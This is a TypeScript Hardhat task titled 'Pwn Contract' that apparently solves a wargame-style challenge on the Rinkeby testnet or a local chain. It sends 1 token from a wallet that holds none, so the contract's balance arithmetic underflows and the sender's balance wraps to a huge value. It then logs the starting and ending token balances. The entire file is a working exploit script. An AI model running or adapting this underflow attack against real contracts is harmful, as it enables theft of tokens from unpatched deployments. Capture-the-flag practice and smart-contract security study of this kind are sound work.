import { task } from 'hardhat/config';
import { Token } from '../../typechain';
import { SignerWithAddress } from '@nomiclabs/hardhat-ethers/dist/src/signer-with-address';
import { TASK_PWN } from '../task-names';
import { Network } from '@ethersproject/networks/lib/types';

import abi from '../../data/abi/Token.json';
import { BigNumber } from '@ethersproject/bignumber';

task(TASK_PWN, 'Pwn Contract')
  .setAction(async (_taskArgs, hre) => {
    const wallets: SignerWithAddress[] = await hre.ethers.getSigners();
    const deployerWallet = wallets[0];
    const userWallet = wallets[1];
    let deployerAddress = deployerWallet.address;
    const address = await userWallet.getAddress();
    console.log(`user address: ${address}`);

    const network: Network = await hre.ethers.provider.getNetwork();
    console.log(`network: ${network.name}`);

    let contractAddress = '';
    if (network.name === 'rinkeby') {
      contractAddress = process.env.RINKEBY_CONTRACT_ADDRESS || '';
      deployerAddress = "0x63be8347a617476ca461649897238a31835a32ce";
    } else if (network.name === 'unknown') { //localhost network
      contractAddress = process.env.LOCALHOST_CONTRACT_ADDRESS || '';
    }
    console.log(`contractAddress: ${contractAddress}`);

    const contract: Token = new hre.ethers.Contract(contractAddress, abi, userWallet) as Token;

    const startingTokens: BigNumber = await contract.balanceOf(userWallet.address);
    console.log(`Starting Tokens: ${startingTokens}`);

    // Cause Overflow
    const overflowAmt: BigNumber = hre.ethers.BigNumber.from('1');
    await contract.connect(userWallet).transfer(deployerAddress, overflowAmt);

    const endingTokens: BigNumber = await contract.balanceOf(userWallet.address);
    console.log(`Ending Tokens: ${endingTokens}`);

    process.exit(0)
  });